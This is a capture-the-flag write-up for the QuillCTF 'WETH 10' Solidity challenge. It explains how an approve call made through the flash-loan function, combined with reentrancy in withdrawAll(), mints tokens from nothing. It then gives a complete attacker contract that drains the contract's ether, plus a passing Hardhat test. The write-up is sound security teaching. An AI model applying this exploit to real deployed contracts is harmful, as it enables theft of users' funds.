# QuillCTF : WETH 10

## Objective of CTF

The contract currently has 10 ethers. (Check the Foundry configuration.)
You are Bob (the White Hat). Your job is to rescue all the funds from the contract, starting with 1 ether, in only one transaction.

### Contract code
```solidity
pragma solidity ^0.8.0;

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";

// The Messi Wrapped Ether
contract WETH10 is ERC20("Messi Wrapped Ether", "WETH10"), ReentrancyGuard {
    receive() external payable {
        deposit();
    }

    function _burnAll() internal {
        _burn(msg.sender, balanceOf(msg.sender));
    }

    function deposit() public payable nonReentrant {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external nonReentrant {
        Address.sendValue(payable(msg.sender), wad);
        _burn(msg.sender, wad);
    }

    function withdrawAll() external nonReentrant {
        Address.sendValue(payable(msg.sender), balanceOf(msg.sender));
        _burnAll();
    }

    /// @notice Request a flash loan in ETH
    function execute(address receiver, uint256 amount, bytes calldata data) external nonReentrant {
        uint256 prevBalance = address(this).balance;
        Address.functionCallWithValue(receiver, data, amount);

        require(address(this).balance >= prevBalance, "flash loan not returned");
    }
}
```

The contract has a flash loan feature, where we can call any address as the WETH10 contract with any calldata, however all functions in the WETH10 contract has `nonReentrant` modifier, so it will revert if we call those functions with `execute()`

However, it inherits openzeppelin ERC20.sol, which the ERC20 functions don't have `nonReentrant` modifier, so we can use the `execute()` to call functions like `approve()` to approve ourselves to transfer WETH10 away from the WETH10 contract 

However this vulnerability alone could not drain the contract, as it just has 10 ether in balance, but it has no WETH10 token at all

Another vulnerability is in `withdrawAll()`, it does not follow the checks effects interactions pattern and is vulnerable to reentrancy

It will first check the caller's WETH10 balance, then call the caller to send the WETH10 balance, then execute `_burnAll()`, which it will check our WETH10 balance again and burn all tokens we have

However, as it check for our WETH10 balance twice, and in between it calls the caller, so reentrancy is possible

Even `withdrawAll()` has `nonReentrant` modifier, ERC20 functions don't have, after it send the ether back to us, we can call the ERC20 `transfer()`, to transfer all our tokens away, so our balance will be changed to 0 when it checks our balance in `_burnAll()`, and no tokens will be burned, with this we can mint tokens out of thin air

For convenience, we can just transfer our balance away to the WETH10 contract, as we already approved ourselves on behalf on the WETH10 contract, we can transfer the tokens back at any time, or an alternative way is to deploy another contract that we control and have it hold the 
tokens for the us

### Attacker contract

```soldity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./weth10.sol";

contract WETH10Solve {
    
    function exploit(address payable weth10) public payable {
        require(msg.value == 0.5 ether, "Invalid msg.value");
        // approve ourselves as the WETH10 contract, so we can transfer token out of it later
        WETH10(weth10).execute(weth10, 0, abi.encodeWithSelector(ERC20.approve.selector, address(this), type(uint256).max));
        
        // mint 10 ether of WETH10 to WETH10 contract, without losing 1 wei
        for (uint i; i < 20; ++i) {
            WETH10(weth10).deposit{value: 0.5 ether}();
            WETH10(weth10).withdrawAll();
        }
        // transfer the WETH10 from the WETH10 contract back to us, as we have infinite allowance, and withdraw all WETH10 token to get back ether
        WETH10(weth10).transferFrom(weth10, address(this), WETH10(weth10).balanceOf(weth10));
        WETH10(weth10).withdrawAll();
        // send ether back to attacker EOA
        payable(msg.sender).transfer(address(this).balance);
    }
    
    fallback() external payable {
        // when withdrawAll() is called, and ether is send back to this contract, we will transfer our WETH10 tokens away, as transfer() is from ERC20.sol and has no ReentrancyGuard, 
        // so our WETH10 balance will be 0, and when it check our WETH10 balance again in _burnAll(), there will be 0 tokens to burn from us
        // we will transfer the tokens to the WETH10 contract, as we have infinite allowance, we can take it back at any time, or we can also deploy another contract to transfer WETH10 to
        WETH10(payable(msg.sender)).transfer(msg.sender, WETH10(payable(msg.sender)).balanceOf(address(this)));
    }
}
```

## Proof of concept

### Hardhat test

```js
const { expect } = require("chai");
const { ethers } = require("hardhat");

describe('QuillCTF : WETH10', () => {

  before(async () => {
    [owner, bob] = await ethers.getSigners();
    contract = await ethers.getContractFactory('WETH10', owner).then(f => f.deploy());
    await contract.deployed();
    // https://github.com/NomicFoundation/hardhat/issues/1585
    // The contract currently has 10 ethers
    await ethers.provider.send("hardhat_setBalance", [contract.address, ethers.utils.hexStripZeros(ethers.utils.parseEther('10').toHexString())]);
    expect(await ethers.provider.getBalance(contract.address)).to.equal(ethers.utils.parseEther('10'));
    // Bob starting with 1 ether
    await ethers.provider.send("hardhat_setBalance", [bob.address, ethers.utils.hexStripZeros(ethers.utils.parseEther('1').toHexString())]);
    expect(await ethers.provider.getBalance(bob.address)).to.equal(ethers.utils.parseEther('1'));
  });

  it('Rescue all the funds from the contract', async () => {
    // deploy the attacker contract
    attackerContract = await ethers
      .getContractFactory('WETH10Solve', bob)
      .then(f => f.deploy());
    await attackerContract.deployed();
    await attackerContract.connect(bob).exploit(contract.address, {value: ethers.utils.parseEther('0.5')});
    // empty weth contract
    expect(await ethers.provider.getBalance(contract.address)).to.equal(0);
    // player should end with 11 ether
    expect(await ethers.provider.getBalance(bob.address)).to.be.gt(ethers.utils.parseEther('10'));
  });
});
```

### Hardhat test output

```
# npx hardhat test test/weth10.js 


  QuillCTF : WETH10
    ✔ Rescue all the funds from the contract (726ms)


  1 passing (3s)
```